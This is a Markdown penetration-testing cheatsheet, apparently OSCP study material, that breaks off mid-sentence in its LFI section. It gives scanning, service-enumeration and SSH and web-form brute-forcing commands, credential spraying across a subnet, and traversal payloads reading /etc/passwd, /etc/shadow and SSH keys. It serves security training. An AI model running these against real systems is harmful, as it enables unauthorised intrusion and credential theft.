# 1. Pentesting Cheatsheet

Commands and short scripts that accomplish useful things for penetration testing/red teaming.

Other great cheetsheets:
- [HackTricks](https://book.hacktricks.xyz/)
- [Red Team Experiments](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
- [Awesome Penetration Testing](https://github.com/enaqx/awesome-pentest)

# 2. Table of Contents
- [1. Pentesting Cheatsheet](#1-pentesting-cheatsheet)
- [2. Table of Contents](#2-table-of-contents)
- [3. Scanning](#3-scanning)
  - [3.1. Rustscan](#31-rustscan)
  - [3.2. Nmap](#32-nmap)
  - [3.3. Nessus](#33-nessus)
  - [3.4. Windows Port Scanning](#34-windows-port-scanning)
  - [3.5. Bash Ping Scanner](#35-bash-ping-scanner)
  - [3.6. Bash Port Scanner](#36-bash-port-scanner)
  - [3.7. IPv6 to bypass IPv4 filters](#37-ipv6-to-bypass-ipv4-filters)
  - [3.8. Whois](#38-whois)
- [4. Services](#4-services)
  - [4.1. 22 - SSH/SFTP](#41-22---sshsftp)
    - [4.1.1. SSH Bruteforcing](#411-ssh-bruteforcing)
    - [4.1.2. Disable SSH Host Key Checking](#412-disable-ssh-host-key-checking)
    - [4.1.3. Use Legacy Key Exchange Algorithm or Cipher with SSH](#413-use-legacy-key-exchange-algorithm-or-cipher-with-ssh)
  - [4.2. 25,465,587 - SMTP/s](#42-25465587---smtps)
  - [4.3. 53 - DNS](#43-53---dns)
    - [4.3.1. DNS Zone Transfer](#431-dns-zone-transfer)
    - [4.3.2. Bruteforcing DNS Records](#432-bruteforcing-dns-records)
  - [4.4. 79 - Finger](#44-79---finger)
  - [4.5. 80,443 - HTTP(s)](#45-80443---https)
    - [4.5.1. Web Scanning/Enumeration](#451-web-scanningenumeration)
    - [4.5.2. Web Bruteforcing](#452-web-bruteforcing)
    - [4.5.5. Directory Traversal](#455-directory-traversal)
    - [4.5.3.1. LFI/RFI](#4531-lfirfi)
      - [4.5.3.2. One-liner PHP Webshells](#4532-one-liner-php-webshells)
    - [4.5.4. Cross-Site Scripting (XSS)](#454-cross-site-scripting-xss)
    - [4.5.6. WordPress](#456-wordpress)
    - [4.5.7. Drupal](#457-drupal)
    - [4.5.8. Joomla](#458-joomla)
  - [4.6. 88/749 Kerberos](#46-88749-kerberos)
  - [4.7. 110,995 - POP](#47-110995---pop)
  - [4.8. 111 - RPCbind](#48-111---rpcbind)
  - [4.9. 119 - NNTP](#49-119---nntp)
  - [4.10. 135 - MSRPC](#410-135---msrpc)
  - [4.11. 139,445 - SMB](#411-139445---smb)
    - [4.11.1. SMB Bruteforcing](#4111-smb-bruteforcing)
    - [4.11.2. Interacting with SMB](#4112-interacting-with-smb)
  - [4.12. 161,162,10161,10162 - SNMP](#412-1611621016110162---snmp)
    - [4.12.1. Exploring MIBs with `snmptranslate`](#4121-exploring-mibs-with-snmptranslate)
    - [4.12.2. RCE with SNMP](#4122-rce-with-snmp)
  - [4.13. 389 - LDAP](#413-389---ldap)
  - [4.14. 1433 - MSSQL](#414-1433---mssql)
    - [4.14.1. MSSQL Bruteforcing](#4141-mssql-bruteforcing)
    - [4.14.2. MSSQL Interaction](#4142-mssql-interaction)
    - [4.14.3. MSSQL Command Execution](#4143-mssql-command-execution)
  - [4.15. 2049 - NFS](#415-2049---nfs)
  - [4.16. 3306 - MySQL Enumeration](#416-3306---mysql-enumeration)
    - [4.16.1. MySQL UDF Exploit](#4161-mysql-udf-exploit)
    - [4.16.2. Grabbing MySQL Passwords](#4162-grabbing-mysql-passwords)
    - [4.16.3. Useful MySQL Files](#4163-useful-mysql-files)
  - [4.17. 3389 - RDP](#417-3389---rdp)
  - [4.18. 5900 - VNC](#418-5900---vnc)
  - [4.19. 27017 - MongoDB](#419-27017---mongodb)
    - [4.19.1. Exploiting NoSQL Injection](#4191-exploiting-nosql-injection)
  - [4.20. Amazon Web Services (AWS) S3 Buckets](#420-amazon-web-services-aws-s3-buckets)
    - [4.20.1. AWS Identity and Access Management (IAM)](#4201-aws-identity-and-access-management-iam)
      - [4.20.1.1. IAM Access Keys](#42011-iam-access-keys)
      - [4.20.1.2. Conducting Reconnaissance with IAM](#42012-conducting-reconnaissance-with-iam)
      - [4.20.1.3. AWS ARNs](#42013-aws-arns)
- [5. Exploitation](#5-exploitation)
  - [5.1. Searchsploit](#51-searchsploit)
  - [5.2. Password Bruteforcing and Cracking](#52-password-bruteforcing-and-cracking)
    - [5.2.1. Cracking with John The Ripper](#521-cracking-with-john-the-ripper)
    - [5.2.2. Cracking with Hashcat](#522-cracking-with-hashcat)
    - [5.2.3. Zip File Password Cracking](#523-zip-file-password-cracking)
  - [5.3. Buffer Overflows](#53-buffer-overflows)
  - [5.4. Reverse Shells](#54-reverse-shells)
    - [5.4.1. Covering your tracks](#541-covering-your-tracks)
    - [5.4.2. Running a detached/daeminized process on Linux](#542-running-a-detacheddaeminized-process-on-linux)
- [6. Windows](#6-windows)
  - [6.1. Basic Windows Post-Exploit Enumeration](#61-basic-windows-post-exploit-enumeration)
  - [6.2. Using Saved Windows Credentials](#62-using-saved-windows-credentials)
  - [6.3. Check Windows File Permissions](#63-check-windows-file-permissions)
  - [6.4. Antivirus \& Firewall Evasion](#64-antivirus--firewall-evasion)
    - [6.4.1. Windows AMSI Bypass](#641-windows-amsi-bypass)
    - [6.4.2. Turn off Windows Firewall](#642-turn-off-windows-firewall)
    - [6.4.3. Turn off Windows Defender](#643-turn-off-windows-defender)
    - [6.4.4. Windows LOLBAS Encoding/Decoding](#644-windows-lolbas-encodingdecoding)
    - [6.4.5. Execute Inline Tasks with MSBuild.exe](#645-execute-inline-tasks-with-msbuildexe)
    - [6.4.6. Custom Windows TCP Reverse Shell](#646-custom-windows-tcp-reverse-shell)
  - [6.5. Windows UAC Bypass](#65-windows-uac-bypass)
  - [6.6. Windows Pass-The-Hash Attacks](#66-windows-pass-the-hash-attacks)
  - [6.7. Windows Token Impersonation](#67-windows-token-impersonation)
    - [6.7.1. Windows Token Impersonation with RoguePotato](#671-windows-token-impersonation-with-roguepotato)
    - [6.7.2. Windows Token Impersonation with PrintSpoofer](#672-windows-token-impersonation-with-printspoofer)
    - [6.7.3. Windows Service Escalation - Registry](#673-windows-service-escalation---registry)
  - [6.8. Compiling Windows Binaries on Linux](#68-compiling-windows-binaries-on-linux)
  - [6.9. Windows Passwords \& Hashes](#69-windows-passwords--hashes)
    - [6.9.1. Finding Windows Passwords in Files](#691-finding-windows-passwords-in-files)
      - [6.9.1.1. Files with Passwords on Windows](#6911-files-with-passwords-on-windows)
    - [6.9.2. Windows Passwords in Registry](#692-windows-passwords-in-registry)
    - [6.9.3. Getting Saved Wifi Passwords on Windows](#693-getting-saved-wifi-passwords-on-windows)
    - [6.9.4. Dumping Hashes from Windows](#694-dumping-hashes-from-windows)
      - [6.9.4.1. Dumping Hashes from Windows Registry Backups](#6941-dumping-hashes-from-windows-registry-backups)
      - [6.9.4.2. Dumping Hashes from Windows Domain Controller](#6942-dumping-hashes-from-windows-domain-controller)
    - [6.9.5. Using mimikatz to dump hashes and passwords](#695-using-mimikatz-to-dump-hashes-and-passwords)
  - [6.10. Windows Files of Interest](#610-windows-files-of-interest)
  - [6.11. Lateral Movement in Windows Active Directory](#611-lateral-movement-in-windows-active-directory)
    - [6.11.1. Quick Active Directory Enumeration](#6111-quick-active-directory-enumeration)
  - [6.12. Miscellaneous Windows Commands](#612-miscellaneous-windows-commands)
  - [6.13. Windows Persistence](#613-windows-persistence)
    - [6.13.1. Remote SYSTEM Backdoor](#6131-remote-system-backdoor)
      - [6.13.1.1. Using Windows Services](#61311-using-windows-services)
      - [6.13.1.2. Using PSExec](#61312-using-psexec)
      - [6.13.1.3. Using Scheduled Tasks](#61313-using-scheduled-tasks)
    - [6.13.2. Remote Admin Backdoor via WMIC](#6132-remote-admin-backdoor-via-wmic)
    - [6.13.3. Add RDP User](#6133-add-rdp-user)
    - [6.13.4. Connect to Windows RDP](#6134-connect-to-windows-rdp)
    - [6.13.5. Change Windows Domain Credentials](#6135-change-windows-domain-credentials)
    - [6.13.6. Create Windows Backdoor Service](#6136-create-windows-backdoor-service)
- [7. Linux](#7-linux)
  - [7.1. Upgrading to Interactive Shell](#71-upgrading-to-interactive-shell)
  - [7.2. Basic Linux Post-Exploit Enumeration](#72-basic-linux-post-exploit-enumeration)
  - [7.3. Watching for Linux Process Changes](#73-watching-for-linux-process-changes)
  - [7.4. Adding root user to /etc/shadow or /etc/passwd](#74-adding-root-user-to-etcshadow-or-etcpasswd)
  - [7.5. Escalating via sudo binaries](#75-escalating-via-sudo-binaries)
  - [7.6. LD\_PRELOAD and LD\_LIBRARY\_PATH](#76-ld_preload-and-ld_library_path)
  - [7.7. SUID binaries](#77-suid-binaries)
  - [7.8. Using NFS for Privilege Escalation](#78-using-nfs-for-privilege-escalation)
  - [7.9. Linux Kernel Exploits](#79-linux-kernel-exploits)
    - [7.9.1. Dirty Cow Linux Privesc](#791-dirty-cow-linux-privesc)
  - [7.10. Linux Files of Interest](#710-linux-files-of-interest)
  - [7.11. Data Wrangling on Linux](#711-data-wrangling-on-linux)
    - [7.11.1. Awk \& Sed](#7111-awk--sed)
  - [7.12. Linux Persistence](#712-linux-persistence)
    - [7.12.1. Grant passwordless sudo access](#7121-grant-passwordless-sudo-access)
    - [7.12.2. Setting SUID bit](#7122-setting-suid-bit)
- [8. Loot](#8-loot)
  - [Sensitive Files](#sensitive-files)
  - [8.1. File Transfers](#81-file-transfers)
    - [8.1.1. Netcat transfer](#811-netcat-transfer)
    - [8.1.2. Curl transfers](#812-curl-transfers)
    - [8.1.3. PowerShell File Transfers](#813-powershell-file-transfers)
    - [8.1.4. Mount NFS Share](#814-mount-nfs-share)
    - [8.1.5. SMB Share](#815-smb-share)
    - [8.1.6. FTP Server on Kali](#816-ftp-server-on-kali)
    - [8.1.7. SSHFS](#817-sshfs)
    - [8.1.8. Windows LOLBAS File Downloads](#818-windows-lolbas-file-downloads)
    - [8.1.9. PHP File Uploads](#819-php-file-uploads)
- [9. Pivoting and Redirection](#9-pivoting-and-redirection)
  - [9.1. SSH Tunnels](#91-ssh-tunnels)
    - [9.1.1. Ad Hoc SSH Port Forwards](#911-ad-hoc-ssh-port-forwards)
  - [9.2. SOCKS Proxies and proxychains](#92-socks-proxies-and-proxychains)
  - [9.3. Bending with iptables](#93-bending-with-iptables)
  - [9.4. Bending with socat](#94-bending-with-socat)
  - [9.5. Bending with rinetd](#95-bending-with-rinetd)
  - [9.6. Bending with netsh](#96-bending-with-netsh)
  - [9.7. Bending with sshuttle](#97-bending-with-sshuttle)
  - [9.8. Bending with chisel](#98-bending-with-chisel)
  - [9.9. Bending with netcat](#99-bending-with-netcat)
- [10. Miscellaneous](#10-miscellaneous)
  - [10.1. Port Knocking](#101-port-knocking)
  - [10.2. Convert text to Windows UTF-16 format on Linux](#102-convert-text-to-windows-utf-16-format-on-linux)
  - [10.3. Extract UDP pcap packet payload data](#103-extract-udp-pcap-packet-payload-data)
  - [10.4. Execute Shellcode from Bash](#104-execute-shellcode-from-bash)
  - [10.5. Encryption](#105-encryption)
    - [10.5.1. Create self-signed SSL/TLS certificate](#1051-create-self-signed-ssltls-certificate)
    - [10.5.2. Decrypting files with GPG](#1052-decrypting-files-with-gpg)
  - [10.6. Validating Checksums](#106-validating-checksums)

# 3. Scanning

## 3.1. Rustscan

Rustscan is a faster way to discover all open ports and autorun Nmap to do the
script scanning on those ports.

```sh
VICTIM_IP=VICTIM_IP
sudo rustscan --ulimit 5000 -a $VICTIM_IP -- -v -n -Pn --script "default,safe,vuln" -sV -oA tcp-all
```

## 3.2. Nmap

If using scripts, you can get script help by `nmap --script-help="nfs-*"`.

```sh
# fast full TCP discovery using massscan:
sudo masscan -p1-65535 $VICTIM_IP --rate=1000 -e tun0 > masscan.txt
ports=$(cat masscan.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -n | tr '\n' ',' | sed 's/,$//')
sudo nmap -v -n -p $ports -oA nmap/tcp-all -Pn --script "default,safe,vuln" -sV $VICTIM_IP

# all TCP ports, fast discovery, then script scan:
# verbose, no DNS resolution, fastest timing, all TCP ports, output all formats
ports=$(nmap -v -n -T4 --min-rate=1000 -p- --open --reason $VICTIM_IP | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -n -v -sC -sV -Pn -p $ports -oA nmap/tcp-all $VICTIM_IP

# UDP fast scan (top 100)
sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA nmap/udp-fast $VICTIM_IP
# top 20 UDP ports
sudo nmap -n -v -sU -T4 --top-ports=20 --reason --open -oA nmap/udp-top20 $VICTIM_IP

# specifying safe and wildcard ftp-* scripts
# logic: and, or, not all work. "," is like "or"
nmap --script="safe and ftp-*" -v -n -p 21 -oA nmap/safe-ftp $VICTIM_IP

# to get help on scripts:
nmap --script-help="ftp-*"
```

Nmap Services file lists most common ports by frequency:

```sh
cat /usr/share/nmap/nmap-services
```

The nmap scripts are found in the directory `/usr/share/nmap/scripts`.

If you add a script to that directory (that you download from the internet, for example), then you must update the `script.db` by running:

```sh
sudo nmap --script-updatedb
```



## 3.3. Nessus

First, manually install Nessus on Kali from the `.deb` file. It's not in the `apt` repo.

[Installation Instructions](https://www.tenable.com/blog/getting-started-with-nessus-on-kali-linux)

```sh
# ensure Nessus is started
sudo systemctl start nessusd.service
```

Browse to **https://127.0.0.1:8834** and accept the self-signed SSL cert. Set up free Nessus Essentials license and complete setup prompts. Also create an admin username and password.

Create a New Scan, and navigate the GUI to configure it. The major scan templates are grouped under Discover, Vulnerability, and Compliance.

Nessus is slow and not allowed on the OSCP exam, so this is mostly just for awareness.




## 3.4. Windows Port Scanning

This is a way to live off the land in Windows and perform a port scan.

```powershell
# perform full TCP connection to test if port open
Test-NetConnection -Port 445 192.168.50.151

# scanning multiple ports
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```

## 3.5. Bash Ping Scanner

Pings all hosts in a /24 subnet. Provide any IP address in the subnet as arg.

```sh
#!/bin/bash
addr=${1:-10.1.1.0}
subnet="${addr%.*}"
for i in {1..254}; do
  host="$subnet.$i"
  ping -c1 -w1 $subnet.$i >& /dev/null && echo "$host UP ++++" || echo "$host down" &
  sleep 0.1 || break  # lets you Ctrl+C out of loop
done
wait $(jobs -rp)
echo "Done"
```

And here's a one-liner to do it in windows:

```bat
:: note: meant to be copy-pasted, not in .bat script (%i vs %%i)
for /L %i in (1,1,255) do @ping -n 1 -w 2 10.2.2.%i | findstr "Reply"
```

## 3.6. Bash Port Scanner

Scans all 65535 ports of a single host. Provide host IP as arg. Only works on Linux systems using bash!

```sh
#!/bin/bash
host=${1}
for port in {1..65535}; do
  timeout .5 bash -c "(echo -n > /dev/tcp/$host/$port) >& /dev/null" &&
    echo "port $port is open" &
done
wait $(jobs -rp)
echo "Done"
```

## 3.7. IPv6 to bypass IPv4 filters

Sometimes if you see `filtered` on an nmap scan, the filter may only be applied on IPv4, but not IPv6. Try scanning it again using the host's IPv6 address.

```bash
# First take note of MAC address from nmap scan of device with 'filtered' port.
# NOTE: nmap must be run as sudo to get MAC address.
# If you don't have the MAC from nmap, you can probably get it from
# your arp table with `arp -an`. If you have a hostname, you can
# do a DNS lookup for the AAAA record.

# get list of IPv6 neighbors on tun0 interface
ping6 -c2 ff02::1%tun0 >/dev/null
ip -6 n | grep -i MACADDR

# Then rescan using nmap's IPv6 mode
sudo nmap -6 -n -v -sC -sV -p FILTERED_PORT IPV6_ADDR
```

Here is another example of a script to try to get the link-local IPv6 address by building the EUI format from the MAC:

```bash
#!/bin/bash -e
# Usage: ./ipv4to6.sh 192.168.0.1
# source: https://askubuntu.com/a/771914

IP=$1
ping -c 1 $1 > /dev/null 2> /dev/null
MAC=$(arp -an $1 | awk '{ print $4 }')
IFACE=$(arp -an $1 | awk '{ print $7 }')

python3 -c "
from netaddr import IPAddress
from netaddr.eui import EUI
mac = EUI(\"$MAC\")
ip = mac.ipv6(IPAddress('fe80::'))
print('{ip}%{iface}'.format(ip=ip, iface=\"$IFACE\"))"
```


## 3.8. Whois

Perform `whois` lookups to get information about a domain name, such as the name server and registrar.

```sh
whois megacorpone.com

# optionally specify server to use for whois lookup
whois megacorpone.com -h $WHOIS_SERVER

# perform a reverse lookup
whois 38.100.193.70
```


# 4. Services

This section includes enumeration, exploitation, and interaction techniques for common services you might discover through scanning.

## 4.1. 22 - SSH/SFTP

Secure Shell (SSH) and Secure File Transfer Protocol (SFTP).

For extremely old versions, check `searchsploit` for vulns. Otherwise, brute-force and user enumeration are usually all you get out of it.

Check [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh) for executing commands with misconfigured SFTP user.

### 4.1.1. SSH Bruteforcing

```sh
# using hydra
# '-s PORT' contact service on non-default port
hydra -V -f -l username -P wordlist.txt -s 2222 $VICTIM_IP ssh

# spray creds to entire subnet to see if they work on other boxes, too!
hydra -V -f -l username -p password -W 5 10.11.1.0/24 ssh

# using patator: useful when services (e.g. ssh) are too old for hydra to work
patator ssh_login host=$VICTIM_IP port=2222 persistent=0 -x ignore:fgrep='failed' user=username password=FILE0 0=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

ncrack -p 22 --user root -P passwords.txt $VICTIM_IP [-T 5]
medusa -u root -P 500-worst-passwords.txt -h $VICTIM_IP -M ssh
```

### 4.1.2. Disable SSH Host Key Checking

Put this at the top of your `~/.ssh/config` to disable it for all hosts:

```
Host *
   StrictHostKeyChecking no
   UserKnownHostsFile /dev/null
```

or use these flags with ssh: `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`

### 4.1.3. Use Legacy Key Exchange Algorithm or Cipher with SSH

If you try to ssh onto a host and get an error like:

```
Unable to negotiate with 10.11.1.252 port 22000: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

You can get around this by adding the `-oKexAlgorithms=+diffie-hellman-group1-sha1` flag to your ssh command. Be sure to pick one of the algorithms listed in their offer.

You can also specify the `KexAlgorithms` variable in the ssh-config file.

Similarly, if you get an error like:

```
Unable to negotiate with 10.11.1.115 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc
```

You can get around this by adding the `-c aes256-cbc` flag to your ssh command. Again, be sure to use one of the ciphers listed in their offer.


## 4.2. 25,465,587 - SMTP/s

```sh
# Banner grab, command/user enum
nc -nvC $VICTIM_IP 25  # "-C" forces sending \r\n line ending, required by smtp
telnet $VICTIM_IP 25  # alternate method, does \r\n by default
# SMTPS
openssl s_client -crlf -connect $VICTIM_IP:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect $VICTIM_IP:587

# on telnet/nc connection, try enumerating users manually via:
EXPN  # get mailing list
VRFY root  # check if you can use VRFY to enumerate users

# basic enumeration
nmap -n -v -p25 --script="smtp-* and safe" -oA nmap/smtp $VICTIM_IP

# enumerate users
nmap -n -v -p25 --script="smtp-enum-users" -oA nmap/smtp-users $VICTIM_IP
# smtp-user-enum lets you check specific usernames, add a domain, and
# specify the mode (EXPN, VRFY, RCPT) for validation
smtp-user-enum -M MODE -U users.txt -D DOMAIN -t $VICTIM_IP
```

Enabling Telnet client on Windows (to allow SMTP interaction, requires Admin rights):

```bat
dism /online /Enable-Feature /FeatureName:TelnetClient
```

Other ideas:
- send email to user (client-side exploit)
- send email to invalid address, get DSN report (info leaks?)

See [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smtp)

## 4.3. 53 - DNS

**PRO TIP**: Make sure you add the DNS entries you discover to your
`/etc/hosts` file. Some web servers do redirection based on domain name!

**Format of `/etc/hosts` entry with multiple subdomains**:

```
10.10.10.10     victim.com mail.victim.com www.victim.com admin.victim.com
```

**General Purpose Enumeration**:

```sh
# dnsenum does full recon, including attempting zone transfers and bruteforcing
# specify "--noreverse" to avoid reverse-IP lookups
dnsenum domain.tld

# can also use dnsrecon, but takes a little more work to specify full enumeration
dnsrecon -a -s -b -y -k -w -d domain.tld

# fierce does a more abbreviated full-enumeration (good for preliminary look)
fierce --domain domain.tld

# dig zone xfer, note "@" before nameserver
dig @ns1.domain.tld -t axfr domain.tld

# get DNS records by type (MX in this case)
host -t MX example.com
```

DNS Queries on Windows:

```bat
nslookup www.example.com

:: Advanced, specify record type and nameserver
nslookup -type=TXT www.example.com ns1.nameserver.com
```

**Common record types**:

- `NS`: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
- `A`: Also known as a host record, the "A record" contains the IP address of a hostname (such as www.example.com).
- `MX`: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.
- `PTR`: Pointer Records are used in reverse lookup zones and are used to find the records associated with an IP address.
- `CNAME`: Canonical Name Records are used to create aliases for other host records.
- `TXT`: Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification.

### 4.3.1. DNS Zone Transfer

This is basically asking for a copy of all DNS entries served by an authoritative server.
It lets you get a list of other subdomains that might be of interest.
If a server is configured properly, it won't give you this info.

```sh
# using dnsrecon
dnsrecon -t axfr -d domain.tld

# using dig, note "@" before nameserver
dig @ns1.nameserver.tld axfr domain.tld

# using host (order of args matters)
host -l domain.tld ns1.nameserver.tld
```

### 4.3.2. Bruteforcing DNS Records

```sh
# using dnsrecon
dnsrecon -D /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t brt -d domain.tld

# specifying a file with dnsenum, also performs normal full enum
dnsenum --noreverse -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt domain.tld

# using nmap dns-brute script
nmap -vv -Pn -T4 -p 53 --script dns-brute domain.tld

# scan through list of subdomains/hostnames using just bash
for subdomain in $(cat list.txt); do host $subdomain.example.com; done

# scan through IP space doing reverse DNS lookups
for oct in $(seq 1 254); do host 192.168.69.$oct; done | grep -v "not found"
```


## 4.4. 79 - Finger

If the `finger` service is running, it is possible to enumerate usernames.

```sh
nmap -vvv -Pn -sC -sV -p79 $VICTIM_IP
```


## 4.5. 80,443 - HTTP(s)

Scans to run every time:

```bash
# enumerate version info of tech stack, find emails, domains, etc.
whatweb -v -a3 --log-verbose whatweb.txt $VICTIM_IP
# to passively accomplish the same thing on a real site, use https://www.wappalyzer.com/

# Gobuster directory/file discovery
# Other extensions to add: asp,aspx,jsp,cgi,pl,py,sh,
ulimit -n 8192 # prevent file access error during scanning
gobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x "txt,htm,html,php" -o gobuster-common.txt -u http://$VICTIM_IP

# look for common vulns with nikto
# -C all means scan all cgi-dirs
nikto -o nikto.txt --maxtime=180s -C all -h $VICTIM_IP
```

Checklist:

- [ ] Check `searchsploit` for vulns in server software, web stack
- [ ] Check `/robots.txt` for directories/files of interest
- [ ] Check `/sitemap.xml` for directories/files of interest
- [ ] Inspect HTML comments/source for juicy info
  - [ ] secrets/passwords
  - [ ] directories of interest
  - [ ] software libraries in use
- [ ] Inspect SSL certs for DNS subdomains and emails
- [ ] Attempt login with default/common creds
- [ ] Test for SQL/NoSQL injection using "bad" chars:
  ```
  '
  "
  \
  ;
  `
  )
  }
   --
   #
  /*
  //
  $
  %
  %%
  ```
- [ ] Test for command injection
  - [ ] separator characters: `; | & || &&`
  - [ ] help msg:  `-h`, `--help`, `/?`
  - [ ] perl injection when opening file:  `echo Injected|`
  - [ ] UNIX subshells: `$(cmd)`, `>(cmd)` and backticks
- [ ] Test for LFI/RFI, especially in URL query params
- [ ] Test for XSS on all input fields, URL query params, and HTTP Headers:
  - [ ] Check what remains after filtering applied on input: `'';!--"<XSS>=&{()}`
  - [ ] Try variations of `<script>alert(1)</script>`


### 4.5.1. Web Scanning/Enumeration

Whatweb shows details about tech stacks in use by server, email addresses found, etc.

```sh
whatweb -v -a3 --log-verbose whatweb.txt $VICTIM_IP
# -v  : verbose
# -a3 : agressive scan
# --log-verbose <file> : save scan output to file
# also supports setting Cookies, HTTP BasicAuth, and proxies
```

**:warning: PHP 5.x is vulnerable to Shellshock!** - If you see it listed by whatweb, exploit it!

Web Directory discovery with Gobuster:

```sh
# Gobuster
ulimit -n 8192 # prevent file access error during scanning
gobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x "txt,htm,html,xhtml,php,asp,aspx,jsp,do,cgi,pl,py,conf" -o gobuster-common.txt -u http://$VICTIM_IP
# -e / --expanded = Expanded mode, print full URLs (easy for clicking to open)
# -z / --no-progress = no progress displayed
# -q / --quiet = quiet mode (no banner)
# -r / --follow-redirect
# -k / --no-tls-validation
# -w / --wordlist
# -t / --threads
# -o / --output

# user-agent:
# -a 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36'
# other good common list: /usr/share/seclists/Discovery/Web-Content/common.txt

# adding a proxy to gobuster:
# --proxy socks5://127.0.0.1:1080

# you can use patterns with the wordlist to fuzz for API endpoints.
# -p / --pattern <pattern-file>
# where pattern files contain placeholder {GOBUSTER} for substitution in wordlist,
# one pattern per line
# Example:
# {GOBUSTER}/v1
# {GOBUSTER}/v2
```

Web Directory discovery with ffuf (great for scanning through SOCKS proxy):

```bash
# FFUF as a dirbuster through a SOCKS proxy
ffuf -o ffuf.json -recursion -recursion-depth 2 -x socks5://localhost:1080 -e .php,.jsp,.txt,.cgi,.asp,.aspx -u http://$VICTIM_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
# pretty print json output:
ffuf.json | python -m json.tool
```

Other web discovery tools:

- feroxbuster - fast scanner written in Rust
- dirb
- dirbuster
- wfuzz


Good wordlists to try:
- /usr/share/dirb/wordlists/small.txt
- /usr/share/dirb/wordlists/common.txt
- /usr/share/dirb/wordlists/catala.txt
- /usr/share/dirb/wordlists/big.txt
- /usr/share/dirbuster/wordlists/directory-list-1.0.txt
- /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
- /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt



### 4.5.2. Web Bruteforcing

Hydra help/usage for specific module:

```bash
hydra -U http-post-form
```

Web Forms (POST request):

```bash
# using hydra
# string format "<webform-path>:<username-field>=^USER^&<password-field>=^PASS^:<bad-pass-marker>"
# '-l admin' means use only the 'admin' username. '-L userlist.txt' uses many usernames
# '-P wordlist.txt' means iterate through all passwords in wordlist. '-p password123' uses only that one.
# '-t 64': use 64 threads
# change to https-web-form for port 443
hydra -V -f -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt $VICTIM_IP http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username" -t 64

# proxy-aware password bruteforcing with ffuf
ffuf -x socks5://localhost:1080 -u http://$VICTIM_IP/login -X POST -w /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -d "Username=admin&Password=FUZZ&RememberMe=true" -fw 6719
```

HTTP BasicAuth (GET request):

```bash
# hydra http basic auth brute force
# Use https-get for https
hydra -L users.txt -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt "http-get://$VICTIM_IP/loginpage:A=BASIC" http-get
```



### 4.5.5. Directory Traversal

On Linux, `/var/www/html/` is commonly the webroot. Other Linux options: `/usr/share/nginx/www` or `/usr/share/nginx/html`.

On Windows IIS, it's `C:\inetpub\wwwroot\`.

Sometimes you can read sensitive files by changing the URL query params to point
to a file using the relative path.

Example:

```
https://example.com/cms/login.php?language=en.html
```

Here, `en.html` appears to be a file in the `/cms/` directory under the webroot.
We can try changing `en.html` to `../../../../etc/passwd` to see if it lets us
view the file.

Things to try when testing for traversal vuln:
- Add extra `../` to ensure you make it all the way to the filesystem root.
- Use backslashes (`\`) instead of forward slashes (`/`), especially on Windows.
- URL encode the `../` -> `%2E%2E%2F` to bypass filters
- Double-encode the `../` -> `%252E%252E%252F`; IIS 5.0 and earlier
- UTF-8 encode the `../` -> `%C0%AE%C0%AE%2F` (`%c0%ae` is `.`); [cve2022-1744][cve2022-1744]
- Use `....//` instead of `../` to bypass filters
- Append null byte (`%00`) if you suspect file extension is getting added
- Check out [DotDotPwn](https://github.com/wireghoul/dotdotpwn) fuzzing tool.

When using `curl` to test, you may need to include the `--path-as-is` flag:

```sh
curl --path-as-is http://localhost/?page=/../../../../etc/passwd
```

[cve2022-1744]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1744

Files to try:
- `/etc/passwd`
- `/etc/shadow` if permissions allow
- `C:\Windows\System32\drivers\etc\hosts` - good to test traversal vuln
- `.ssh/id_rsa` files under user home dir (after seeing in `/etc/passwd`)
- config files:
  - `C:\inetpub\wwwroot\web.config` - on IIS server
  - `/usr/local/etc/apache22/httpd.conf`
  - `/etc/apache2/apache2.conf`
  - `grep CustomLog /etc/httpd/conf/httpd.conf`
- log files:
  - `C:\inetpub\logs\LogFiles\W3SVC1\` and `\W3SVC2\` and `\W3SVC3` and `\HTTPERR\`
  - `C:\xampp\apache\logs\access.log` and `C:\xampp\apache\logs\error.log`
  - RHEL/CentOS/Fedora - `/var/log/httpd/access_log` and `/error_log`
  - Debian/Ubuntu - `/var/log/apache2/access.log` and `/error.log`
  - FreeBSD - `/var/log/httpd-access.log` and `/httpd-error.log`


More Windows log and config paths [here](https://techcommunity.microsoft.com/t5/iis-support-blog/collect-basics-configuration-and-logs-when-troubleshooting-iis/ba-p/830927).




### 4.5.3.1. LFI/RFI

Local File Inclusion is basically code execution that requires directory traversal.
LFI/RFI can be leveraged with PHP (`.php`, most common), Perl (`.pl`), Active
Server Pages (`.asp`), Active Server Pages Extended (`.aspx`), Java Server
